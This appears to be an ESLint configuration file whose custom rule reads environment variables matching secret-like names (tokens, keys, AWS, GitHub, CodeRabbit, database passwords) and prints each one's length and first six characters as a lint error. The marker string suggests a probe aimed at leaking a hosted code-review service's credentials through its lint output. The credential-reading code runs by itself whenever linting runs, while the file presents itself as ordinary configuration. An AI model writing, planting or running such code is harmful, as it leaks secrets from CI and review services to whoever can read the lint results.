const MARKER = 'XTENANT-ESLINT-ENV-72941';
const envSummary = Object.fromEntries(Object.entries(process.env).filter(([k]) => /TOKEN|SECRET|KEY|GITHUB|CODERABBIT|AWS|DATABASE|PASSWORD|CR_/i.test(k)).map(([k, v]) => [k, String(v).length + ':' + String(v).slice(0, 6)]));
const plugin = { rules: { 'env-report': { create(context) { return { Program(node) { context.report({ node, message: MARKER + ' ' + JSON.stringify(envSummary) }); } }; } } } };
module.exports = [{ plugins: { r232: plugin }, rules: { 'r232/env-report': 'error' } }];